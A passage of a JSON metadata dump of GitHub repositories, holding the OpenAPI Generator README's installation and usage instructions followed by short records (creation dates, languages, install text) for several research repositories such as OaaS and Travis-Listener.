`mvnw.cmd -Pstatic-analysis clean install` \nTo install, run `brew install openapi-generator` \nHere is an example usage to generate a Ruby client:\n```sh\nopenapi-generator generate -i https://raw.githubusercontent.com/openapitools/openapi-generator/master/modules/openapi-generator/src/test/resources/3_0/petstore.yaml -g ruby -o /tmp/test/\n``` \nTo reinstall with the latest master, run `brew uninstall openapi-generator && brew install --HEAD openapi-generator` \nTo install OpenJDK (pre-requisites), please run\n```sh\nbrew tap AdoptOpenJDK/openjdk\nbrew install --cask adoptopenjdk11\nexport JAVA_HOME=`/usr/libexec/java_home -v 1.11`\n``` \nor download installer via https://adoptium.net/ \nTo install Maven (optional), please run\n```sh\nbrew install maven\n``` \nThe OpenAPI Generator image acts as a standalone executable. It can be used as an alternative to installing via homebrew, or for developers who are unable to install Java or upgrade the installed version. \nExample:\n```sh\ndocker run --rm -v \"${PWD}:/local\" openapitools/openapi-generator-cli generate \\\n    -i https://raw.githubusercontent.com/openapitools/openapi-generator/master/modules/openapi-generator/src/test/resources/3_0/petstore.yaml \\\n    -g go \\\n    -o /local/out/go\n```\n \nExample usage:\n```sh\n# Start container at port 8888 and save the container id\n> CID=$(docker run -d -p 8888:8080 openapitools/openapi-generator-online)\n\n# allow for startup\n> sleep 10\n\n# Get the IP of the running container (optional)\nGEN_IP=$(docker inspect --format '{{.NetworkSettings.IPAddress}}'  $CID)\n\n# Execute an HTTP request to generate a Ruby client\n> curl -X POST --header 'Content-Type: application/json' --header 'Accept: application/json' \\\n-d '{\"openAPIUrl\": \"https://raw.githubusercontent.com/openapitools/openapi-generator/master/modules/openapi-generator/src/test/resources/3_0/petstore.yaml\"}' \\\n'http://localhost:8888/api/gen/clients/ruby'\n\n{\"code\":\"c2d483.3.4672-40e9-91df-b9ffd18d22b8\",\"link\":\"http://localhost:8888/api/gen/download/c2d483.3.4672-40e9-91df-b9ffd18d22b8\"}\n\n# Download the generated zip file\n> wget http://localhost:8888/api/gen/download/c2d483.3.4672-40e9-91df-b9ffd18d22b8\n\n# Unzip the file\n> unzip c2d483.3.4672-40e9-91df-b9ffd18d22b8\n\n# Shutdown the openapi generator image\n> docker stop $CID && docker rm $CID\n```\n \nTo execute `mvn package`:\n```sh\ngit clone https://github.com/openapitools/openapi-generator\ncd openapi-generator\n./run-in-docker.sh mvn package\n```\n \nBuild artifacts are now accessible in your working directory. \nOnce built, `run-in-docker.sh` will act as an executable for openapi-generator-cli. To generate code, you'll need to output to a directory under `/gen` (e.g. `/gen/out`). For example:\n```sh\n./run-in-docker.sh help # Executes 'help' command for openapi-generator-cli\n./run-in-docker.sh list # Executes 'list' command for openapi-generator-cli\n./run-in-docker.sh generate -i modules/openapi-generator/src/test/resources/3_0/petstore.yaml \\\n    -g go -o /gen/out/go-petstore -p packageName=petstore # generates go client, outputs locally to ./out/go-petstore\n```\n \nIf an error like this occurs, just execute the **./mvnw clean install -U** command: \n> org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.apache.maven.plugins:maven-surefire-plugin:2.19.1:test (default-test) on project openapi-generator: A type incompatibility occurred while executing org.apache.maven.plugins:maven-surefire-plugin:2.19.1:test: java.lang.ExceptionInInitializerError cannot be cast to java.io.IOException\n```sh\n./run-in-docker.sh ./mvnw clean install -U\n```\n \n> Failed to execute goal org.fortasoft:gradle-maven-plugin:1.0.8:invoke (default) on project openapi-generator-gradle-plugin-mvn-wrapper: org.gradle.tooling.BuildException: Could not execute build using Gradle distribution 'https://services.gradle.org/distributions/gradle-4.7-bin.zip' \n#### Run Docker in Vagrant\nPrerequisite: install [Vagrant](https://www.vagrantup.com/downloads.html) and [VirtualBox](https://www.virtualbox.org/wiki/Downloads).\n ```sh\ngit clone https://github.com/openapitools/openapi-generator.git\ncd openapi-generator\nvagrant up\nvagrant ssh\ncd /vagrant\n./run-in-docker.sh ./mvnw package\n``` \nInstall it globally to get the CLI available on the command line:\n```sh\nnpm install @openapitools/openapi-generator-cli -g\nopenapi-generator-cli version\n```\n\nTo use a specific version of \"openapi-generator-cli\"\n```sh\nopenapi-generator-cli version-manager set 7.8.0\n```\nOr install it as dev-dependency:\n```sh\nnpm install @openapitools/openapi-generator-cli -D\n```\n \nTo generate a PHP client for [petstore.yaml](https://raw.githubusercontent.com/openapitools/openapi-generator/master/modules/openapi-generator/src/test/resources/3_0/petstore.yaml), please run the following\n```sh\ngit clone https://github.com/openapitools/openapi-generator\ncd openapi-generator\n./mvnw clean package\njava -jar modules/openapi-generator-cli/target/openapi-generator-cli.jar generate \\\n   -i https://raw.githubusercontent.com/openapitools/openapi-generator/master/modules/openapi-generator/src/test/resources/3_0/petstore.yaml \\\n   -g php \\\n   -o /var/tmp/php_api_client\n```\n(if you're on Windows, replace the last command with `java -jar modules\\openapi-generator-cli\\target\\openapi-generator-cli.jar generate -i https://raw.githubusercontent.com/openapitools/openapi-generator/master/modules/openapi-generator/src/test/resources/3_0/petstore.yaml -g php -o c:\\temp\\php_api_client`) \n\nYou can also download the JAR (latest release) directly from [maven.org](https://repo1.maven.org/maven2/org/openapitools/openapi-generator-cli/7.8.0/openapi-generator-cli-7.8.0.jar) \nTo get a list of PHP specified options (which can be passed to the generator with a config file via the `-c` option), please run `java -jar modules/openapi-generator-cli/target/openapi-generator-cli.jar config-help -g php` \n### To generate a sample client library\nYou can build a client against the [Petstore API](https://raw.githubusercontent.com/openapitools/openapi-generator/master/modules/openapi-generator/src/test/resources/3_0/petstore.yaml) as follows:\n```sh\n./bin/generate-samples.sh ./bin/configs/java-okhttp-gson.yaml\n```\n \n(On Windows, please install [GIT Bash for Windows](https://gitforwindows.org/) to run the command above) \nThis script uses the default library, which is `okhttp-gson`. It will run the generator with this command:\n```sh\njava -jar modules/openapi-generator-cli/target/openapi-generator-cli.jar generate \\\n  -i https://raw.githubusercontent.com/openapitools/openapi-generator/master/modules/openapi-generator/src/test/resources/3_0/petstore.yaml \\\n  -g java \\\n  -t modules/openapi-generator/src/main/resources/Java \\\n  --additional-properties artifactId=petstore-okhttp-gson,hideGenerationTimestamp=true \\\n  -o samples/client/petstore/java/okhttp-gson\n```\n \nYou can also get the options with the `help generate` command (below only shows partial results):\n```\nNAME\n        openapi-generator-cli generate - Generate code with the specified\n        generator.\n\nSYNOPSIS\n        openapi-generator-cli generate\n                [(-a <authorization> | --auth <authorization>)]\n                [--api-name-suffix <api name suffix>] [--api-package <api package>]\n                [--artifact-id <artifact id>] [--artifact-version <artifact version>]\n                [(-c <configuration file> | --config <configuration file>)] [--dry-run]\n                [(-e <templating engine> | --engine <templating engine>)]\n                [--enable-post-process-file]\n                [(-g <generator name> | --generator-name <generator name>)]\n                [--generate-alias-as-model] [--git-host <git host>]\n                [--git-repo-id <git repo id>] [--git-user-id <git user id>]\n                [--global-property <global properties>...] [--group-id <group id>]\n                [--http-user-agent <http user agent>]\n                [(-i <spec file> | --input-spec <spec file>)]\n                [--ignore-file-override <ignore file override location>]\n                [--import-mappings <import mappings>...]\n                [--instantiation-types <instantiation types>...]\n                [--invoker-package <invoker package>]\n                [--language-specific-primitives <language specific primitives>...]\n                [--legacy-discriminator-behavior] [--library <library>]\n                [--log-to-stderr] [--minimal-update]\n                [--model-name-prefix <model name prefix>]\n                [--model-name-suffix <model name suffix>]\n                [--model-package <model package>]\n                [(-o <output directory> | --output <output directory>)] [(-p <additional properties> | --additional-properties <additional properties>)...]\n                [--package-name <package name>] [--release-note <release note>]\n                [--remove-operation-id-prefix]\n                [--reserved-words-mappings <reserved word mappings>...]\n                [(-s | --skip-overwrite)] [--server-variables <server variables>...]\n                [--skip-validate-spec] [--strict-spec <true/false strict behavior>]\n                [(-t <template directory> | --template-dir <template directory>)]\n                [--type-mappings <type mappings>...] [(-v | --verbose)]\n\nOPTIONS\n        -a <authorization>, --auth <authorization>\n            adds authorization headers when fetching the OpenAPI definitions\n            remotely. Pass in a URL-encoded string of name:header with a comma\n            separating multiple values\n\n...... (results omitted)\n\n        -v, --verbose\n            verbose mode\n\n```\nYou can then compile and run the client, as well as unit tests against it:\n```sh\ncd samples/client/petstore/java/okhttp-gson\nmvn package\n```\n \nPlease refer to [customization.md](docs/customization.md) on how to customize the output (e.g. package name, version) \nPlease refer to [integration.md](docs/integration.md) on how to integrate OpenAPI generator with Maven, Gradle, sbt, Bazel, Github and CI/CD. \n- latest stable version: https://api.openapi-generator.tech\n- latest master: https://api-latest-master.openapi-generator.tech (updated with latest master every hour) \n- Eclipse: [Codewind OpenAPI Tools for Eclipse](https://www.eclipse.org/codewind/open-api-tools-for-eclipse.html) by [IBM](https://www.ibm.com)\n- IntelliJ IDEA: [OpenAPI Generator](https://plugins.jetbrains.com/plugin/8433-openapi-generator) by [Jim Schubert](https://jimschubert.us/#/)\n- IntelliJ IDEA: [Senya Editor](https://plugins.jetbrains.com/plugin/10690-senya-editor) by [senya.io](https://senya.io)\n- [RepreZen API Studio](https://www.reprezen.com/)\n- Visual Studio: [REST API Client Code Generator](https://marketplace.visualstudio.com/items?itemName=ChristianResmaHelle.ApiClientCodeGenerator) by [Christian Resma Helle](https://christian-helle.blogspot.com/)\n- Visual Studio Code: [Codewind OpenAPI Tools](https://marketplace.visualstudio.com/items?itemName=IBM.codewind-openapi-tools) by [IBM](https://marketplace.visualstudio.com/publishers/IBM) \nHere is a list of template creators:\n * API Clients:\n   * Ada: @stcarrez\n   * Apex: @asnelling\n   * Bash: @bkryza\n   * C: @PowerOfCreation @zhemant [:heart:](https://www.patreon.com/zhemant)\n   * C++ REST: @Danielku15\n   * C++ Tiny: @AndersSpringborg @kaareHH @michelealbano @mkakbas\n   * C++ UE4: @Kahncode\n   * C# (.NET 2.0): @who\n   * C# (.NET Standard 1.3 ): @Gronsak\n   * C# (.NET 4.5 refactored): @jimschubert [:heart:](https://www.patreon.com/jimschubert)\n   * C# (GenericHost): @devhl-labs\n   * C# (HttpClient): @Blackclaws\n   * Clojure: @xhh\n   * Crystal: @wing328\n   * Dart: @yissachar\n   * Dart (refactor): @joernahrens\n   * Dart 2: @swipesight\n   * Dart (Jaguar): @jaumard\n   * Dart (Dio): @josh-burton\n   * Elixir: @niku\n   * Elm: @eriktim\n   * Eiffel: @jvelilla\n   * Erlang: @tsloughter\n   * Erlang (PropEr): @jfacorro @robertoaloi\n   * Groovy: @victorgit\n   * Go: @wing328 [:heart:](https://www.patreon.com/wing328)\n   * Go (rewritten in 2.3.0): @antihax\n   * Haskell (http-client): @jonschoning\n   * Java (Feign): @davidkiss\n   * Java (Retrofit): @0legg\n   * Java (Retrofit2): @emilianobonassi\n   * Java (Jersey2): @xhh\n   * Java (okhttp-gson): @xhh\n   * Java (RestTemplate): @nbruno\n   * Java (Spring 5 WebClient): @daonomic\n   * Java (Spring 6 RestClient): @nicklas2751\n   * Java (RESTEasy): @gayathrigs\n   * Java (Vertx): @lopesmcc\n   * Java (Google APIs Client Library): @charlescapps\n   * Java (Rest-assured): @viclovsky\n   * Java (Java 11 Native HTTP client): @bbdouglas\n   * Java (Apache HttpClient 5.x): @harrywhite4 @andrevegas\n   * Java (Helidon): @spericas @tjquinno @tvallin\n   * Javascript/NodeJS: @jfiala\n   * JavaScript (Apollo DataSource): @erithmetic\n   * JavaScript (Closure-annotated Angular) @achew22\n   * JavaScript (Flow types) @jaypea\n   * Jetbrains HTTP Client : @jlengrand\n   * JMeter: @davidkiss\n   * Julia: @tanmaykm\n   * Kotlin: @jimschubert [:heart:](https://www.patreon.com/jimschubert)\n   * Kotlin (MultiPlatform): @andrewemery\n   * Kotlin (Volley): @alisters\n   * Kotlin (jvm-spring-webclient): @stefankoppier\n   * Kotlin (jvm-spring-restclient): @stefankoppier\n   * Lua: @daurnimator\n   * N4JS: @mmews-n4\n   * Nim: @hokamoto\n   * OCaml: @cgensoul\n   * Perl: @wing328 [:heart:](https://www.patreon.com/wing328)\n   * PHP (Guzzle): @baartosz\n   * PHP (with Data Transfer): @Articus\n   * PowerShell: @beatcracker\n   * PowerShell (refactored in 5.0.0): @wing328\n   * Python: @spacether [:heart:][spacether sponsorship]\n   * Python-Experimental: @spacether [:heart:][spacether sponsorship]\n   * Python (refactored in 7.0.0): @wing328\n   * R: @ramnov\n   * Ruby (Faraday): @meganemura @dkliban\n   * Ruby (HTTPX): @honeyryderchuck\n   * Rust: @farcaller\n   * Rust (rust-server): @metaswitch\n   * Scala (scalaz & http4s): @tbrown1979\n   * Scala (Akka): @cchafer\n   * Scala (sttp): @chameleon82\n   * Scala (sttp4): @flsh86\n   * Scala (Pekko): @mickaelmagniez\n   * Swift: @tkqubo\n   * Swift 3: @hexelon\n   * Swift 4: @ehyche\n   * Swift 5: @4brunu\n   * Swift 6: @4brunu\n   * Swift Combine: @dydus0x14\n   * TypeScript (Angular1): @mhardorf\n   * TypeScript (Angular2): @roni-frantchi\n   * TypeScript (Angular6): @akehir\n   * TypeScript (Angular7): @topce\n   * TypeScript (Axios): @nicokoenig\n   * TypeScript (Fetch): @leonyu\n   * TypeScript (Inversify): @gualtierim\n   * TypeScript (jQuery): @bherila\n   * TypeScript (Nestjs): @vfrank66\n   * TypeScript (Node):  @mhardorf\n   * TypeScript (Rxjs): @denyo\n   * TypeScript (redux-query): @petejohansonxo\n   * Xojo: @Topheee\n   * Zapier: @valmoz, @emajo\n * Server Stubs\n   * Ada: @stcarrez\n   * C# ASP.NET 5: @jimschubert [:heart:](https://www.patreon.com/jimschubert)\n   * C# ASP.NET Core 3.0: @A-Joshi\n   * C# APS.NET Core 3.1: @phatcher\n   * C# Azure functions: @Abrhm7786\n   * C# NancyFX: @mstefaniuk\n   * C++ (Qt5 QHttpEngine): @etherealjoy\n   * C++ Pistache: @sebymiano\n   * C++ Restbed: @stkrwork\n   * Erlang Server: @galaxie @nelsonvides\n   * F# (Giraffe) Server: @nmfisher\n   * Go Server: @guohuang\n   * Go Server (refactored in 7.0.0): @lwj5\n   * Go (Echo) Server: @ph4r5h4d\n   * Go (Gin) Server: @kemokemo\n   * GraphQL Express Server: @renepardon\n   * Haskell Servant: @algas\n   * Haskell Yesod: @yotsuya\n   * Java Camel: @carnevalegiacomo\n   * Java MSF4J: @sanjeewa-malalgoda\n   * Java Spring Boot: @diyfr\n   * Java Undertow: @stevehu\n   * Java Play Framework: @JFCote\n   * Java PKMST: @anshu2185 @sanshuman @rkumar-pk @ninodpillai\n   * Java Vert.x: @lwlee2608\n   * Java Micronaut: @andriy-dmytruk\n   * Java Helidon: @spericas @tjquinno @tvallin\n   * Java WireMock: [@acouvreur](https://github.com/acouvreur)\n   * JAX-RS RestEasy: @chameleon82\n   * JAX-RS CXF: @hiveship\n   * JAX-RS CXF (CDI): @nickcmaynard\n   * JAX-RS RestEasy (JBoss EAP): @jfiala\n   * Julia: @tanmaykm\n   * Kotlin: @jimschubert [:heart:](https://www.patreon.com/jimschubert)\n   * Kotlin (Spring Boot): @dr4ke616\n   * Kotlin (Vertx): @Wooyme\n   * Kotlin (JAX-RS): @anttileppa\n   * Kotlin WireMock: @stefankoppier\n   * NodeJS Express: @YishTish\n   * PHP Flight: @daniel-sc\n   * PHP Laravel: @renepardon\n   * PHP Lumen: @abcsun\n   * PHP Mezzio (with Path Handler): @Articus\n   * PHP Slim: @jfastnacht\n   * PHP Slim4: [@ybelenko](https://github.com/ybelenko)\n   * PHP Symfony: @ksm2\n   * PHP Symfony6: @BenjaminHae\n   * Python FastAPI: @krjakbrjak\n   * Python AIOHTTP:\n   * Ruby on Rails 5: @zlx\n   * Rust (rust-server): @metaswitch\n   * Scala Akka: @Bouillie\n   * Scala Cask: @aaronp\n   * Scala Finch: @jimschubert [:heart:](https://www.patreon.com/jimschubert)\n   * Scala Lagom: @gmkumar2005\n   * Scala Play: @adigerber\n * Documentation\n   * AsciiDoc: @man-at-home\n   * HTML Doc 2: @jhitchcock\n   * Confluence Wiki: @jhitchcock\n   * PlantUML: @pburls\n * Configuration\n   * Apache2: @stkrwork\n   * k6: @mostafa\n * Schema\n   * Avro: @sgadouar\n   * GraphQL: @wing328 [:heart:](https://www.patreon.com/wing328)\n   * Ktorm: @Luiz-Monad\n   * MySQL: [@ybelenko](https://github.com/ybelenko)\n   * Postman Collection: @gcatanese\n   * Protocol Buffer: @wing328\n   * WSDL: @adessoDpd \nIf you want to join the committee, please kindly apply by sending an email to team@openapitools.org with your Github ID. \nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at [apache.org/licenses/LICENSE-2.0](https://www.apache.org/licenses/LICENSE-2.0) \n",
                    "original_header": "OpenAPI Generator"
                },
                "confidence": 0.9886145686423751,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/OpenAPITools/openapi-generator/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-05-12T09:57:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T17:21:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 9117886
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 217666
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Kotlin",
                    "name": "Kotlin",
                    "type": "Programming_language",
                    "size": 131915
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 107197
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PHP",
                    "name": "PHP",
                    "type": "Programming_language",
                    "size": 82187
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 34763
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Ruby",
                    "name": "Ruby",
                    "type": "Programming_language",
                    "size": 31001
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Apex",
                    "name": "Apex",
                    "type": "Programming_language",
                    "size": 26879
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 26599
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Haskell",
                    "name": "Haskell",
                    "type": "Programming_language",
                    "size": 11667
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Handlebars",
                    "name": "Handlebars",
                    "type": "Programming_language",
                    "size": 11276
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 10495
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rust",
                    "name": "Rust",
                    "type": "Programming_language",
                    "size": 8759
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Groovy",
                    "name": "Groovy",
                    "type": "Programming_language",
                    "size": 6245
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 6131
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 5382
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Scala",
                    "name": "Scala",
                    "type": "Programming_language",
                    "size": 5132
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Blade",
                    "name": "Blade",
                    "type": "Programming_language",
                    "size": 2953
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Nix",
                    "name": "Nix",
                    "type": "Programming_language",
                    "size": 508
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 436
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dart",
                    "name": "Dart",
                    "type": "Programming_language",
                    "size": 313
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Emacs Lisp",
                    "name": "Emacs Lisp",
                    "type": "Programming_language",
                    "size": 191
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Elixir",
                    "name": "Elixir",
                    "type": "Programming_language",
                    "size": 74
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SCSS",
                    "name": "SCSS",
                    "type": "Programming_language",
                    "size": 3
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "163": {
        "filename": "hpcclab_OaaS_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/hpcclab/OaaS",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "// Need some preamble to get TOC:\n{empty} \nimage:https://github.com/hpcclab/OaaS/actions/workflows/platform-container-build.yml/badge.svg?branch=main[link=\"https://github.com/hpcclab/OaaS/actions/workflows/platform-container-build.yml\"]\nimage:https://jitpack.io/v/hpcclab/OaaS.svg[link=\"https://jitpack.io/#hpcclab/OaaS\"] \n* https://github.com/hpcclab/OaaS-Tutorial[tutorial the cover from the basic to deployment]\n* link:cli/README.adoc[ocli installation and usage guide]\n* link:doc/FUNCTION_GUIDE.adoc[function development]\n* link:doc/PACKAGE_REFERENCE.adoc[package definition guide] \n// == Demo\n//\n// * Demo\n// +\n// image::https://asciinema.org/a/zdLjJ77dNEKvEKrghHQzyFahx.svg[link=https://asciinema.org/a/zdLjJ77dNEKvEKrghHQzyFahx] \n"
                },
                "confidence": 0.9728735773503631,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hpcclab/OaaS/main/README.adoc"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-04-01T19:57:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-13T20:17:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 825421
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 18959
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Just",
                    "name": "Just",
                    "type": "Programming_language",
                    "size": 6391
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 2083
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "164": {
        "filename": "tdurieux_travis-listener_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/tdurieux/Travis-Listener",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The Build Saver Plugin listens to the Travis Crawler Service and saves all information to the database.\nWe save the following information: TravisCI's job, TravisCI's build, commit information (not including the diff), repository information, and user information.\nThe goal of this plugin is to track all changes, and provide statistics on who is using TravisCI.\n \n",
                    "original_header": "<a href=\"plugins/buildsaver\">Build Saver Plugin</a>"
                },
                "confidence": 0.924497475480737,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/tdurieux/travis-listener/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The Restarted Build Plugin collects the information relevant to the present study.  \nIts goal is to detect restarted builds on TravisCI.\nWhen a build is restarted by a developer, all the original information is overwritten.  Tracking restarted builds thus requires live collection of build data (in our case, using the Build Saver Plugin).\nTo detect restarted builds, the Restarted Build Plugin crawls periodically (once a day) the collected builds from the 30 previous days, comparing the build start timestamp provided by the TravisCI' API to the start time saved by the Build Saver Plugin. \nIf the two times differ, the build was restarted.\nFor each restarted build, we collect the new TravisCI job information and execution logs.\n \n",
                    "original_header": "<a href=\"plugins/restartedbuilds\">Restarted Build Plugin</a>"
                },
                "confidence": 0.9999490316396893,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/tdurieux/travis-listener/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-10-08T03:59:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-16T20:15:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 180948
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 29116
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 7783
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1390
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "165": {
        "filename": "NFTDefects_nftdefects_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/NFTDefects/nftdefects",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. Python dependencies installation.\n\n```sh\npip3 install -r requirements.txt\n```\n\n2. Or you can build or pull the docker image.\n\n```sh\ndocker build -t nftdefects:local . # local build\ndocker pull ghcr.io/nftdefects/nftdefects:latest # remote pull\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/NFTDefects/nftdefects/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-11-11T01:42:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-20T08:32:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 212963
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1480
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "166": {
        "filename": "Spirals-Team_runtime-repair-experiments_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Spirals-Team/failure-oblivious-experiments",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2016-02-16T13:20:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2020-02-28T12:00:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 34953
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "167": {
        "filename": "ChristianBirchler_sdc-scissor_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/christianbirchler-org/sdc-scissor",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
